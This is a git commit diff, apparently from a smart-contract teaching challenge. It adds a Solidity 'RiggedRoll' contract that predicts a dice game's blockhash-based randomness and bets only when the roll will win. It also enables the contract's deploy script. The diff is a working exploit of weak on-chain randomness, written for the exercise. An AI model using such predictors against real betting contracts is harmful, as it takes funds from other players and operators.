98855f8af7b630f439339e213fdcdab061cd70a7
etikshajain <jainetiksha@gmail.com>
2023-02-16 15:22:12 +0530

    checkpoint 1,2,3-rigged roll()

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -8,17 +8,40 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 contract RiggedRoll is Ownable {
 
     DiceGame public diceGame;
+    address public diceGameAddr;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
+        diceGameAddr = diceGameAddress;
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
 
-
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public payable {
+        // Predicting the outcome of the roll
+        uint256 nonce = diceGame.nonce();
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGameAddr, nonce));
+        uint256 roll = uint256(hash) % 16;
 
+        console.log('\t',"   Predicted Roll:",roll);
+
+        if(roll>2){
+            return;
+        }
+        else{
+            // Check that this contract has atleast 0.002 eth
+            uint256 ValueToSend = 0.002 ether;
+            require(address(this).balance>=ValueToSend, "You do not have enough eth to make a roll!");
+
+            // Make the roll
+            diceGame.rollTheDice{value: ValueToSend}();
+            // require(sent, "Failed to roll dice!");
+        }
+    }
 
     //Add receive() function so contract can receive Eth
-    
+    receive() external payable {
+    }
 }
--- packages/hardhat/deploy/01_deploy_riggedRoll.js
+++ packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -9,15 +9,13 @@ module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
 
   const diceGame = await ethers.getContract("DiceGame", deployer);
 
-  /*
   await deploy("RiggedRoll", {
    from: deployer,
    args: [diceGame.address],
    log: true,
   });
-  */
 
-  //const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
+  const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
 
   //const ownershipTransaction = await riggedRoll.transferOwnership("** YOUR FRONTEND ADDRESS **");
   
